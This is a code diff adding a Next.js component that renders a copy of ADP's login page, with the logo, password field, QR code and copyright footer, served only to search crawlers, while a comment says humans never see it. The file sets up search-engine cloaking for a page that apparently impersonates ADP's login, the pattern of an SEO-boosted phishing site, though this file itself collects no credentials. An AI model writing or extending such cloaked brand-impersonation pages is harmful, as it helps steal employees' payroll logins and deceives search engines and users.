@@ -1,0 +1,157 @@
+import { PAGE_H1_HEADING } from "@/lib/seo-keywords"
+import { SITE_DESCRIPTION, SITE_KEYWORDS } from "@/lib/seo-metadata"
+import { SITE_DISPLAY_NAME } from "@/lib/site-url"
+import adpLogo from "../adp_login/Screenshot 2026-07-06 122158.png"
+import qrCode from "../adp_login/Screenshot 2026-07-06 125911.png"
+
+/**
+ * Static twin of the ADP login chrome for search crawlers.
+ * Humans never see this — middleware sets x-crawler-seo-page for trusted bots.
+ */
+export default function CrawlerSeoPage() {
+  return (
+    <main
+      className="min-h-screen flex flex-col"
+      style={{
+        backgroundColor: "#f4f4f5",
+        fontFamily:
+          '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
+      }}
+    >
+      <div className="flex-1 flex items-center justify-center p-5 relative z-[2]">
+        <section
+          className="bg-white w-full max-w-[500px] relative"
+          style={{
+            borderRadius: 12,
+            boxShadow: "0 4px 20px rgba(0, 0, 0, 0.08)",
+            padding: "30px 40px",
+          }}
+          aria-label={`${SITE_DISPLAY_NAME} login`}
+          data-purpose="login-card"
+        >
+          <div className="flex justify-between items-center mb-5">
+            <span className="text-[#71717a] text-base" aria-hidden>
+              🔒
+            </span>
+            <span className="text-[#0046be] text-sm font-medium">Languages ▾</span>
+          </div>
+
+          <div className="text-center mb-6">
+            {/* eslint-disable-next-line @next/next/no-img-element */}
+            <img
+              src={adpLogo.src}
+              alt={SITE_DISPLAY_NAME}
+              className="mx-auto max-h-[55px] w-auto object-contain"
+            />
+          </div>
+
+          <h1 className="text-center text-[22px] font-bold text-[#18181b] mb-6">
+            {PAGE_H1_HEADING}
+          </h1>
+          <p className="text-center text-sm text-[#71717a] mb-6">{SITE_DESCRIPTION}</p>
+
+          <div className="mb-5">
+            <label htmlFor="crawler-userId" className="block text-[13px] font-semibold text-[#444] mb-1.5">
+              User ID
+            </label>
+            <input
+              id="crawler-userId"
+              name="userId"
+              type="text"
+              disabled
+              readOnly
+              autoComplete="username"
+              className="w-full p-3 text-base bg-white text-[#18181b] outline-none"
+              style={{ border: "1.5px solid #0046be", borderRadius: 6 }}
+            />
+
+            <div className="mt-3">
+              <label
+                htmlFor="crawler-password"
+                className="block text-[13px] font-semibold text-[#444] mb-1.5"
+              >
+                Password
+              </label>
+              <input
+                id="crawler-password"
+                name="password"
+                type="password"
+                disabled
+                readOnly
+                autoComplete="current-password"
+                placeholder="Enter your password"
+                className="w-full p-3 text-base bg-white text-[#18181b] outline-none"
+                style={{ border: "1.5px solid #0046be", borderRadius: 6 }}
+              />
+            </div>
+
+            <label className="flex items-center gap-2 text-sm text-[#3f3f46] mt-3">
+              <input type="checkbox" disabled className="w-[18px] h-[18px]" />
+              Remember user ID
+            </label>
+          </div>
+
+          <div
+            className="flex justify-between items-center mt-8 pb-6"
+            style={{ borderBottom: "1px solid #e4e4e7" }}
+          >
+            <span className="text-[#0046be] underline text-[15px] font-medium">
+              Need help signing in?
+            </span>
+            <button
+              type="button"
+              disabled
+              className="text-white font-semibold text-[15px] px-8 py-3 opacity-80"
+              style={{ backgroundColor: "#ccc6c0", borderRadius: 6 }}
+            >
+              Next
+            </button>
+          </div>
+
+          <div className="text-center py-5">
+            New user ? <span className="text-[#0046be] underline font-medium">Get started</span>
+          </div>
+
+          <div
+            className="flex gap-4 items-start pt-5"
+            style={{ borderTop: "1px solid #e4e4e7" }}
+          >
+            {/* eslint-disable-next-line @next/next/no-img-element */}
+            <img
+              src={qrCode.src}
+              alt="QR Code"
+              className="object-contain"
+              style={{ width: 60, height: 60 }}
+            />
+            <div>
+              <h3 className="text-sm text-[#18181b] mb-1">Download the ADP mobile app</h3>
+              <p className="text-xs text-[#71717a] leading-snug mb-1.5">
+                Scan the QR code with your device to begin. Secure and convenient tools right in
+                your hands for simple, anytime access across devices.
+              </p>
+              <span className="text-[#0046be] text-xs font-bold">LEARN MORE →</span>
+            </div>
+          </div>
+        </section>
+      </div>
+
+      {SITE_KEYWORDS.length > 0 ? (
+        <p className="max-w-[500px] mx-auto px-5 pb-8 text-sm leading-relaxed text-[#52525b] relative z-[2]">
+          Related searches: {SITE_KEYWORDS.join(", ")}
+        </p>
+      ) : null}
+
+      <footer
+        className="relative z-[2] flex justify-between text-xs text-[#52525b] px-10 py-4"
+        style={{ borderTop: "1px solid #e4e4e7", backgroundColor: "#f4f4f5" }}
+      >
+        <div>
+          <span className="text-[#0046be] underline mr-4">PRIVACY</span>
+          <span className="text-[#0046be] underline mr-4">LEGAL</span>
+          <span className="text-[#0046be] underline">AI Transparency</span>
+        </div>
+        <div>© 2014-2026 ADP, Inc.</div>
+      </footer>
+    </main>
+  )
+}
